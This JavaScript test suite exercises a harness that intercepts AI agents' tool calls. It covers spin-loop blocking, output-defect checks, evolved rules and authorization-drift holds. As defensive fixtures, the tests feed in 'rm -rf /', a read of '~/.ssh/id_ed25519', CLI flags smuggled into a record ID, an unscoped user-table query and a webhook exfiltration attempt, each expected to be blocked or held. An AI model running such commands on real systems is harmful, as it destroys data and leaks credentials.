import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { DatabaseSync } from 'node:sqlite';

import {
  createKruschStack,
  SCALE_TIERS,
  resolveScaleProfile,
  buildSafeGeminiToolConfig,
  normalizeCodeSnippetForHash,
  canonicalizeGroundedToolCallKey,
  inspectOutputDefects,
  execCommandWithPartialStdout,
  compileTurnZeroGrounding
} from '../src/index.js';
import {
  SYNTHESIZED_RULE_ACTIONS,
  DEFAULT_EVOLVED_HARNESS_RULES,
  evolveRulesFromTraces,
  SENSITIVE_SCOPE_DOMAINS,
  AUTH_DRIFT_REASON_CODES,
  auditTrajectoryAuthorizationDrift
} from '../src/engines/grounded-harness-engine.js';
import { startHttpGateway } from '../bin/krusch-stack.js';

describe('Tier 3B Extension: Grounded Harness Engine (INV-STACK-11 / INV-GH-01..12)', () => {
  test('INV-GH-01 & INV-GH-08: Turn-0 grounding extracts CSV "NA" keep_default_na=False, JSON null/[] hazards, SQLite DDL, excludes .env, and pins prefixHash', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'krusch-stack-gh-'));
    try {
      fs.writeFileSync(
        path.join(tmpDir, 'payments.csv'),
        'merchant,country,fee_bps\nAcme,NA,25\nGlobex,EU,18\n',
        'utf8'
      );
      fs.writeFileSync(
        path.join(tmpDir, 'fees.json'),
        JSON.stringify([
          { rule_id: 1, capture_delay: null, payment_method: [], rate: 0.015 },
          { rule_id: 2, capture_delay: 'immediate', payment_method: ['visa'], rate: 0.02 }
        ]),
        'utf8'
      );
      fs.writeFileSync(
        path.join(tmpDir, 'manual.md'),
        '# Acquiring Fee Manual\n\nIn our region codes, NA stands for North America and null or [] means wildcard applies to all.\n',
        'utf8'
      );
      const dummyEnvSecret = ['sk', 'unit', 'redacted', 'fixture', '000001'].join('-');
      fs.writeFileSync(path.join(tmpDir, '.env'), `OPENAI_API_KEY=${dummyEnvSecret}\n`, 'utf8');

      const sqlitePath = path.join(tmpDir, 'ledger.sqlite');
      const sampleDb = new DatabaseSync(sqlitePath);
      sampleDb.exec('CREATE TABLE settlements (id INTEGER PRIMARY KEY, region TEXT, amount_cents INTEGER);');
      sampleDb.exec("INSERT INTO settlements (region, amount_cents) VALUES ('NA', 4200);");
      sampleDb.close();

      const g1 = compileTurnZeroGrounding({
        workspaceDir: tmpDir,
        goal: 'Compute North America fee rate from manual and payments',
        model: 'gemini-4-argon',
        tools: []
      });
      const g2 = compileTurnZeroGrounding({
        workspaceDir: tmpDir,
        goal: 'Different per-turn question that must not mutate static prefixHash',
        model: 'gemini-4-argon',
        tools: []
      });

      assert.equal(g1.ok, true);
      assert.equal(g1.data.llmIngestionCalls, 0);
      assert.equal(g1.data.prefixHash.length, 64);
      assert.equal(g1.data.prefixHash, g2.data.prefixHash, 'Static prefixHash must stay KV-cache stable across goals');
      assert.deepEqual(g1.data.geminiToolConfig, {
        functionCallingConfig: { mode: 'NONE' }
      });

      const summaryText = g1.data.workspace.schemaSummaryText;
      assert.match(summaryText, /keep_default_na=False/);
      assert.match(summaryText, /null or \[\]/i);
      assert.match(summaryText, /settlements/);
      assert.equal(summaryText.includes(dummyEnvSecret), false);
      assert.equal(Object.keys(g1.data.fileDigests).some((f) => f.endsWith('.env')), false);
      assert.ok(g1.data.retrievedChunks.length >= 1);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  test('INV-GH-02 & INV-GH-03: Gemini tool-less NONE guard and monotonic scale-aware profiles', () => {
    assert.deepEqual(buildSafeGeminiToolConfig({ tools: [] }), {
      functionCallingConfig: { mode: 'NONE' }
    });
    assert.equal(
      buildSafeGeminiToolConfig({ tools: [{ name: 'search_docs' }] }),
      null
    );

    const small7b = resolveScaleProfile({ model: 'qwen2.5-coder:7b' });
    const smallMoe = resolveScaleProfile({
      model: 'qwen3-coder-30b-moe',
      preferThinkingStepForSmallActive: true
    });
    const midDense = resolveScaleProfile({ model: 'gemma4:31b' });
    const frontier = resolveScaleProfile({ model: 'gemini-4-argon' });

    assert.equal(small7b.tier, SCALE_TIERS.SMALL_MODEL);
    assert.equal(smallMoe.tier, SCALE_TIERS.SMALL_MODEL);
    assert.equal(smallMoe.softHoldPlaceholdersAndDates, true);
    assert.equal(smallMoe.maxMechanicalVerifyNudges, 1);
    assert.equal(smallMoe.maxReadStreak, 0);

    assert.equal(midDense.tier, SCALE_TIERS.MID_MODEL);
    assert.equal(midDense.softHoldPlaceholdersAndDates, false);
    assert.equal(midDense.rescueSerializedToolCalls, true);
    assert.equal(midDense.maxMechanicalVerifyNudges, 0);

    assert.equal(frontier.tier, SCALE_TIERS.FRONTIER_REASONING);
    assert.equal(frontier.thinkingEnabled, true);
    assert.equal(frontier.rescueSerializedToolCalls, false);
    assert.equal(frontier.maxMechanicalVerifyNudges, 0);
    assert.equal(frontier.maxReadStreak, 0);
  });

  test('INV-GH-04: Comment-normalized call hashing preserves Python // floor division and string literals', () => {
    const pyA = 'x = 17 // 3  # compute quotient\nurl = "https://example.com/a#b"\nprint(x)\n';
    const pyB = 'x = 17 // 3  # different comment text\nurl = "https://example.com/a#b"\n\nprint(x)\n';
    const pyFloatDiv = 'x = 17 / 3\nurl = "https://example.com/a#b"\nprint(x)\n';

    assert.equal(normalizeCodeSnippetForHash(pyA), normalizeCodeSnippetForHash(pyB));
    assert.notEqual(normalizeCodeSnippetForHash(pyA), normalizeCodeSnippetForHash(pyFloatDiv));

    const sigA = canonicalizeGroundedToolCallKey('run_python', { code: pyA });
    const sigB = canonicalizeGroundedToolCallKey('run_python', { code: pyB });
    assert.equal(sigA.callSignature, sigB.callSignature);
  });

  test('INV-GH-04..06: Unlimited distinct reads, MEMOIZED -> BLOCK_SPIN_LOOP, post-mutation re-reads, and defect-only verifyStop', () => {
    const stack = createKruschStack({ ephemeral: true });
    const started = stack.groundedHarness.startSession({
      session_id: 'gh-unit-1',
      goal: 'Inspect 8 files, apply a fix, re-read, and verify output',
      model: 'openai/gpt-5.6-sol'
    });
    assert.equal(started.ok, true);
    assert.equal(started.data.scaleProfile.tier, SCALE_TIERS.FRONTIER_REASONING);

    // 8 distinct consecutive reads must all ALLOW (maxReadStreak === 0)
    for (let i = 1; i <= 8; i += 1) {
      const stepRes = stack.groundedHarness.interceptToolCall({
        session_id: 'gh-unit-1',
        step: i,
        tool_name: 'read_record',
        args: { id: `rec_${i}` }
      });
      assert.equal(stepRes.data.decision, 'ALLOW');
      stack.groundedHarness.recordToolOutcome({
        session_id: 'gh-unit-1',
        event_id: stepRes.data.event_id,
        ok: true,
        result_preview: `record ${i} payload`
      });
    }

    // Repeat #1 of rec_1 -> MEMOIZED; Repeat #2 of rec_1 -> BLOCK_SPIN_LOOP
    const repeat1 = stack.groundedHarness.interceptToolCall({
      session_id: 'gh-unit-1',
      step: 9,
      tool_name: 'read_record',
      args: { id: 'rec_1' }
    });
    assert.equal(repeat1.data.decision, 'MEMOIZED');
    assert.equal(repeat1.data.reason, 'MEMOIZED_PRIOR_READ');

    const repeat2 = stack.groundedHarness.interceptToolCall({
      session_id: 'gh-unit-1',
      step: 10,
      tool_name: 'read_record',
      args: { id: 'rec_1' }
    });
    assert.equal(repeat2.data.decision, 'BLOCK');
    assert.equal(repeat2.data.reason, 'BLOCK_SPIN_LOOP');

    // Commit a mutating call, then verify post-mutation re-read of rec_1 is ALLOWED!
    const mut = stack.groundedHarness.interceptToolCall({
      session_id: 'gh-unit-1',
      step: 11,
      tool_name: 'update_record',
      args: { id: 'rec_1', status: 'reconciled' },
      mutating: true
    });
    assert.equal(mut.data.decision, 'ALLOW');
    stack.groundedHarness.recordToolOutcome({
      session_id: 'gh-unit-1',
      event_id: mut.data.event_id,
      ok: true,
      result_preview: 'updated rec_1',
      pending_diffs_delta: 1
    });

    const postMutRead = stack.groundedHarness.interceptToolCall({
      session_id: 'gh-unit-1',
      step: 12,
      tool_name: 'read_record',
      args: { id: 'rec_1' }
    });
    assert.equal(postMutRead.data.decision, 'ALLOW', 'Post-mutation verification re-read must be allowed');

    // Unverified staged diff blocks stop with FORCE_VERIFY
    const blockedDiffStop = stack.groundedHarness.verifyStop({
      session_id: 'gh-unit-1',
      assistant_text: 'All done.'
    });
    assert.equal(blockedDiffStop.data.allowStop, false);
    assert.equal(blockedDiffStop.data.action, 'FORCE_VERIFY');

    // Mark verification passed, then test defect gate vs clean zero/Not Applicable answers
    stack.groundedHarness.recordToolOutcome({
      session_id: 'gh-unit-1',
      event_id: postMutRead.data.event_id,
      ok: true,
      result_preview: 'verified rec_1',
      verification_passed: true
    });

    const defectStop = stack.groundedHarness.verifyStop({
      session_id: 'gh-unit-1',
      candidate_answer: 'np.float64(42.5)',
      expect_non_empty_answer: true
    });
    assert.equal(defectStop.data.allowStop, false);
    assert.equal(defectStop.data.action, 'REJECT_OUTPUT_DEFECT');
    assert.equal(defectStop.data.reason, 'RAW_DATAFRAME_OR_NUMPY_REPR');

    // Legitimate "0" and "Not Applicable" answers pass inspectOutputDefects with 0 defects
    assert.equal(
      inspectOutputDefects({ candidateAnswer: '0', expectNonEmptyAnswer: true }).hasDefect,
      false
    );
    assert.equal(
      inspectOutputDefects({ candidateAnswer: 'Not Applicable', expectNonEmptyAnswer: true }).hasDefect,
      false
    );
    assert.equal(
      inspectOutputDefects({ candidateAnswer: 'NaN', expectNonEmptyAnswer: true }).hasDefect,
      true
    );
    assert.equal(
      inspectOutputDefects({ assistantText: '<tool_call>{"name":"send_email"}</tool_call>' }).hasDefect,
      true
    );

    const cleanStop = stack.groundedHarness.verifyStop({
      session_id: 'gh-unit-1',
      candidate_answer: '42.50',
      assistant_text: 'Reconciled rec_1 (42.50).'
    });
    assert.equal(cleanStop.data.allowStop, true);
    assert.equal(cleanStop.data.action, 'ALLOW_STOP');
  });

  test('INV-GH-10 & HTTP Gateway: execCommandWithPartialStdout preserves stdout on timeout and POST /grounded-harness/* keeps 39 MCP tools intact', async () => {
    const timed = await execCommandWithPartialStdout(
      process.execPath,
      ['-e', 'process.stdout.write("INTERMEDIATE_METRIC=90.0\\n"); setTimeout(() => {}, 5000);'],
      { timeoutMs: 120, label: 'python_sandbox' }
    );
    assert.equal(timed.timedOut, true);
    assert.equal(timed.hasFinalAnswer, false);
    assert.match(timed.stdout, /INTERMEDIATE_METRIC=90\.0/);
    assert.match(timed.formattedObservation, /PARTIAL STDOUT BEFORE TIMEOUT/);

    const gw = await startHttpGateway({ port: 0, ephemeral: true });
    const addr = gw.server.address();
    const baseUrl = `http://127.0.0.1:${addr.port}`;
    try {
      const toolsRes = await fetch(`${baseUrl}/tools`).then((r) => r.json());
      assert.equal(toolsRes.ok, true);
      assert.equal(toolsRes.count, 39, 'ALL_STACK_TOOLS.length === 39 invariant must remain intact');

      const startRes = await fetch(`${baseUrl}/grounded-harness/ground-and-start`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: 'gw-gh-1',
          goal: 'Verify HTTP grounded harness lifecycle',
          model: 'qwen2.5-coder:7b'
        })
      }).then((r) => r.json());
      assert.equal(startRes.ok, true);
      assert.equal(startRes.data.session.scaleProfile.tier, SCALE_TIERS.SMALL_MODEL);

      // Policy floor blocks rm -rf /
      const floorRes = await fetch(`${baseUrl}/grounded-harness/intercept`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: 'gw-gh-1',
          step: 1,
          tool_name: 'run_shell',
          args: { cmd: 'rm -rf /' },
          mutating: true
        })
      }).then((r) => r.json());
      assert.equal(floorRes.data.decision, 'BLOCK');
      assert.equal(floorRes.data.reason, 'POLICY_FLOOR_DESTRUCTIVE_COMMAND');

      // Policy-grounded abstention on SMALL_MODEL stops cleanly with 0 self-doubt nudges
      const abstainRes = await fetch(`${baseUrl}/grounded-harness/verify-stop`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: 'gw-gh-1',
          assistant_text: 'Subject: Hold — I cannot send this message because policy requires manual sign-off.'
        })
      }).then((r) => r.json());
      assert.equal(abstainRes.data.allowStop, true);

      const summaryRes = await fetch(`${baseUrl}/grounded-harness/summary`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_id: 'gw-gh-1' })
      }).then((r) => r.json());
      assert.equal(summaryRes.ok, true);
      assert.equal(summaryRes.data.metrics.policyFloorBlocks, 1);
      assert.equal(summaryRes.data.metrics.verifyNudgesUsed, 0);
    } finally {
      await new Promise((resolve) => gw.server.close(resolve));
    }
  });

  test('INV-GH-11: Meta-Harness holdout verifier accepts GH-EVO-01..05, rejects unsafe/false-positive candidates, and executes evolved rules live', async () => {
    const evolved = await evolveRulesFromTraces({
      rows: [
        {
          task_id: 'pass-1',
          config: 'grounded',
          resolved: true,
          exit_status: 'Submitted',
          turns: 4,
          patch_lines: 6,
          steps: [
            { command: 'pytest -q', returncode: 0, outputPreview: '4 passed' },
            { command: 'echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT', returncode: 0, outputPreview: '' }
          ]
        },
        {
          task_id: 'fail-echo-loop',
          config: 'baseline',
          resolved: false,
          exit_status: 'LimitsExceeded',
          turns: 30,
          patch_lines: 4,
          steps: [
            { command: 'echo "Task completed successfully!"', returncode: 0, outputPreview: 'Task completed successfully!' },
            { command: 'echo "Task completed successfully!"', returncode: 0, outputPreview: 'Task completed successfully!' }
          ]
        }
      ],
      extraCandidateRules: [
        {
          id: 'BAD-CATCHALL',
          action: SYNTHESIZED_RULE_ACTIONS.HOLD_TOOL_PATTERN,
          commandRegex: '.*',
          correctivePrompt: 'Never accept catch-all'
        },
        {
          id: 'BAD-REDOS',
          action: SYNTHESIZED_RULE_ACTIONS.HOLD_TOOL_PATTERN,
          commandRegex: '^(a+)+$',
          correctivePrompt: 'Nested quantifier ReDoS must be rejected'
        },
        {
          id: 'BAD-FLOOR',
          action: SYNTHESIZED_RULE_ACTIONS.EXEMPT_DUPLICATE_WRITE,
          commandRegex: '^rm\\s+-rf\\s+/.*$'
        },
        {
          id: 'BAD-CLEAN-FP',
          action: SYNTHESIZED_RULE_ACTIONS.HOLD_TOOL_PATTERN,
          commandRegex: '^pytest\\b',
          correctivePrompt: 'Must never block pytest'
        },
        {
          id: 'BAD-TEST-DELETE',
          action: SYNTHESIZED_RULE_ACTIONS.EXEMPT_CLEANUP_DIFF,
          commandRegex: '^rm\\s+tests/.*$'
        }
      ]
    });

    assert.equal(evolved.ok, true);
    assert.equal(evolved.data.acceptedRules.length, DEFAULT_EVOLVED_HARNESS_RULES.length);
    assert.equal(evolved.data.rejectedRules.length, 5);

    const stack = createKruschStack({ ephemeral: true });
    stack.groundedHarness.startSession({
      session_id: 'gh-evo-live',
      goal: 'Edit src/app.js, rollback safely, run inline test, clean scratch file, and block echo spin',
      model: 'gemini-4-argon'
    });

    // GH-EVO-01: Idempotent single-file git checkout -- src/app.js is exempt from BLOCK_DUPLICATE_WRITE
    for (let attempt = 1; attempt <= 2; attempt += 1) {
      const rb = stack.groundedHarness.interceptToolCall({
        session_id: 'gh-evo-live',
        step: attempt,
        tool_name: 'run_command',
        args: { command: 'git checkout -- src/app.js' },
        mutating: true
      });
      assert.equal(rb.data.decision, 'ALLOW', `Rollback attempt #${attempt} must not be blocked`);
      stack.groundedHarness.recordToolOutcome({
        session_id: 'gh-evo-live',
        event_id: rb.data.event_id,
        ok: true,
        pending_diffs_delta: 0
      });
    }

    // Stage a real diff (pending_diffs_count = 1, latest_verification_passed = 0)
    const editCall = stack.groundedHarness.interceptToolCall({
      session_id: 'gh-evo-live',
      step: 3,
      tool_name: 'write_file',
      args: { path: 'src/app.js', content: 'export const ready = true;\n' },
      mutating: true
    });
    assert.equal(editCall.data.decision, 'ALLOW');
    const afterEdit = stack.groundedHarness.recordToolOutcome({
      session_id: 'gh-evo-live',
      event_id: editCall.data.event_id,
      ok: true,
      pending_diffs_delta: 1
    });
    assert.equal(afterEdit.data.pending_diffs_count, 1);
    assert.equal(afterEdit.data.latest_verification_passed, 0);

    // GH-EVO-03: Exit-0 inline test command automatically credits verification & clears pending_diffs_count
    const inlineTest = stack.groundedHarness.interceptToolCall({
      session_id: 'gh-evo-live',
      step: 4,
      tool_name: 'run_command',
      args: { command: 'npm test' }
    });
    assert.equal(inlineTest.data.decision, 'ALLOW');
    const afterTest = stack.groundedHarness.recordToolOutcome({
      session_id: 'gh-evo-live',
      event_id: inlineTest.data.event_id,
      ok: true,
      result_preview: 'all tests passed'
    });
    assert.equal(afterTest.data.latest_verification_passed, 1);
    assert.equal(afterTest.data.pending_diffs_count, 0);

    // GH-EVO-02: Scratch cleanup after passing tests does not re-dirty pending_diffs_count
    const scratchRm = stack.groundedHarness.interceptToolCall({
      session_id: 'gh-evo-live',
      step: 5,
      tool_name: 'run_command',
      args: { command: 'rm -f test_scratch.js' },
      mutating: true
    });
    assert.equal(scratchRm.data.decision, 'ALLOW');
    const afterScratch = stack.groundedHarness.recordToolOutcome({
      session_id: 'gh-evo-live',
      event_id: scratchRm.data.event_id,
      ok: true,
      pending_diffs_delta: 1
    });
    assert.equal(afterScratch.data.pending_diffs_count, 0);
    assert.equal(afterScratch.data.latest_verification_passed, 1);

    // GH-EVO-04: 2nd consecutive celebratory echo loop is held with PSEUDO_COMPLETION_ECHO_LOOP
    const echo1 = stack.groundedHarness.interceptToolCall({
      session_id: 'gh-evo-live',
      step: 6,
      tool_name: 'bash',
      args: { command: 'echo "Task completed successfully!"' }
    });
    assert.equal(echo1.data.decision, 'ALLOW');

    const echo2 = stack.groundedHarness.interceptToolCall({
      session_id: 'gh-evo-live',
      step: 7,
      tool_name: 'bash',
      args: { command: 'echo "Implementation complete and ready for use!"' }
    });
    assert.equal(echo2.data.decision, 'HOLD');
    assert.equal(echo2.data.reason, 'PSEUDO_COMPLETION_ECHO_LOOP');
    assert.equal(echo2.data.rule_id, 'GH-EVO-04');
  });

  test('INV-GH-12: DART zero-turn boundary repair/hold, SERS authorization drift & taint exfiltration block, and legacy SQLite migration', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'krusch-stack-legacy-gh-'));
    try {
      // Seed a legacy pre-INV-GH-12 30-column grounded_sessions table to verify seamless ALTER TABLE migration
      const dbPath = path.join(tmpDir, 'legacy-stack.db');
      const legacyDb = new DatabaseSync(dbPath);
      legacyDb.exec(`
        CREATE TABLE grounded_sessions (
          session_id TEXT PRIMARY KEY,
          goal TEXT NOT NULL,
          model TEXT NOT NULL DEFAULT '',
          scale_tier TEXT NOT NULL,
          scale_profile_json TEXT NOT NULL,
          anchor_date TEXT NOT NULL DEFAULT '',
          prefix_hash TEXT NOT NULL DEFAULT '',
          status TEXT NOT NULL DEFAULT 'ACTIVE',
          max_duplicate_writes INTEGER NOT NULL DEFAULT 1,
          seen_chunks_json TEXT NOT NULL DEFAULT '[]',
          file_digests_json TEXT NOT NULL DEFAULT '{}',
          schema_tokens_saved INTEGER NOT NULL DEFAULT 0,
          schema_reduction_pct REAL NOT NULL DEFAULT 0,
          turn0_tokens INTEGER NOT NULL DEFAULT 0,
          exploratory_reads INTEGER NOT NULL DEFAULT 0,
          committed_reads INTEGER NOT NULL DEFAULT 0,
          committed_mutations INTEGER NOT NULL DEFAULT 0,
          memoized_reads INTEGER NOT NULL DEFAULT 0,
          spin_loops_blocked INTEGER NOT NULL DEFAULT 0,
          output_defects_caught INTEGER NOT NULL DEFAULT 0,
          timeouts_with_partial_stdout INTEGER NOT NULL DEFAULT 0,
          turn0_duplicates_suppressed INTEGER NOT NULL DEFAULT 0,
          duplicate_writes_blocked INTEGER NOT NULL DEFAULT 0,
          policy_floor_blocks INTEGER NOT NULL DEFAULT 0,
          truncation_recoveries INTEGER NOT NULL DEFAULT 0,
          verify_nudges_used INTEGER NOT NULL DEFAULT 0,
          pending_diffs_count INTEGER NOT NULL DEFAULT 0,
          latest_verification_passed INTEGER NOT NULL DEFAULT 1,
          created_at_ms INTEGER NOT NULL,
          updated_at_ms INTEGER NOT NULL
        );
      `);
      legacyDb.close();

      const stack = createKruschStack({ dbPath });
      const started = stack.groundedHarness.startSession({
        session_id: 'gh-dart-sers-1',
        goal: 'Lookup status of order ord_42 in orders table',
        model: 'gemini-4-argon',
        max_bulk_limit: 500
      });
      assert.equal(started.ok, true);

      // 1. DART zero-turn lossless repair: stringified boolean, pagination integer, and optional null cursor
      const repairedRead = stack.groundedHarness.interceptToolCall({
        session_id: 'gh-dart-sers-1',
        step: 1,
        tool_name: 'list_orders',
        args: { id: 'ord_42', limit: '25', dryRun: 'false', cursor: 'null' }
      });
      assert.equal(repairedRead.data.decision, 'ALLOW');
      assert.deepEqual(repairedRead.data.repairedArgs, {
        id: 'ord_42',
        limit: 25,
        dryRun: false,
        cursor: null
      });
      assert.equal(repairedRead.data.dartRepairs.length, 3);

      // 2. DART unsafe realization hold: CLI flags stuffed into structured MCP record ID
      const cliStuffed = stack.groundedHarness.interceptToolCall({
        session_id: 'gh-dart-sers-1',
        step: 2,
        tool_name: 'get_order',
        args: { id: 'ord_42 --all --force' }
      });
      assert.equal(cliStuffed.data.decision, 'HOLD');
      assert.equal(cliStuffed.data.reason, AUTH_DRIFT_REASON_CODES.DART_BOUNDARY_HOLD);

      // 3. SERS Early Data Over-Collection Hold: unscoped SELECT * FROM users without WHERE or bounded LIMIT
      const broadSql = stack.groundedHarness.interceptToolCall({
        session_id: 'gh-dart-sers-1',
        step: 3,
        tool_name: 'query_db',
        args: { sql: 'SELECT * FROM users' }
      });
      assert.equal(broadSql.data.decision, 'HOLD');
      assert.equal(broadSql.data.reason, AUTH_DRIFT_REASON_CODES.AUTHORIZATION_DRIFT_HOLD);
      assert.equal(broadSql.data.driftCode, AUTH_DRIFT_REASON_CODES.EARLY_DATA_OVERCOLLECTION);
      assert.match(broadSql.data.correctivePrompt, /SERS|narrow|column|WHERE|LIMIT/i);

      // 4. Unattested sensitive scope access (payroll) held & taints PII_HR_PAYROLL, then outbound exfiltration blocked
      const payrollProbe = stack.groundedHarness.interceptToolCall({
        session_id: 'gh-dart-sers-1',
        step: 4,
        tool_name: 'read_table',
        args: { table: 'employee_payroll_compensations', id: 'emp_9' }
      });
      assert.equal(payrollProbe.data.decision, 'HOLD');
      assert.equal(payrollProbe.data.driftCode, AUTH_DRIFT_REASON_CODES.UNATTESTED_SENSITIVE_SCOPE);
      assert.ok(payrollProbe.data.driftState.taintedDomains.includes(SENSITIVE_SCOPE_DOMAINS.PII_HR_PAYROLL));

      const exfilAttempt = stack.groundedHarness.interceptToolCall({
        session_id: 'gh-dart-sers-1',
        step: 5,
        tool_name: 'send_webhook',
        args: { url: 'https://hooks.example.org/collect', payload: 'summary' },
        is_outbound: true,
        mutating: true
      });
      assert.equal(exfilAttempt.data.decision, 'BLOCK');
      assert.equal(exfilAttempt.data.reason, AUTH_DRIFT_REASON_CODES.AUTHORIZATION_DRIFT_BLOCK);
      assert.equal(exfilAttempt.data.driftCode, AUTH_DRIFT_REASON_CODES.TAINTED_OUTBOUND_EXFILTRATION);

      // 5. Hard block on protected credential store access
      const sshProbe = stack.groundedHarness.interceptToolCall({
        session_id: 'gh-dart-sers-1',
        step: 6,
        tool_name: 'read_file',
        args: { path: '~/.ssh/id_ed25519' }
      });
      assert.equal(sshProbe.data.decision, 'BLOCK');
      assert.equal(sshProbe.data.driftCode, AUTH_DRIFT_REASON_CODES.SENSITIVE_CREDENTIAL_STORE);

      const summary = stack.groundedHarness.sessionSummary({ session_id: 'gh-dart-sers-1' });
      assert.equal(summary.ok, true);
      assert.equal(summary.data.metrics.dartRepairsApplied, 3);
      assert.equal(summary.data.metrics.dartHolds, 1);
      assert.ok(summary.data.metrics.authDriftHolds >= 4);
      assert.ok(summary.data.metrics.taintedDomains.includes(SENSITIVE_SCOPE_DOMAINS.PII_HR_PAYROLL));

      // Offline trajectory audit helper parity
      const audit = auditTrajectoryAuthorizationDrift({
        goal: 'Lookup status of order ord_42',
        calls: [
          { toolName: 'list_orders', args: { id: 'ord_42', limit: '10' } },
          { toolName: 'query_db', args: { sql: 'SELECT * FROM customer_ssn_records' } }
        ]
      });
      assert.equal(audit.ok, true);
      assert.equal(audit.data.counts.dartRepairsCount, 1);
      assert.ok(audit.data.counts.authDriftHoldsCount >= 1);

      stack.db.close();
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
});
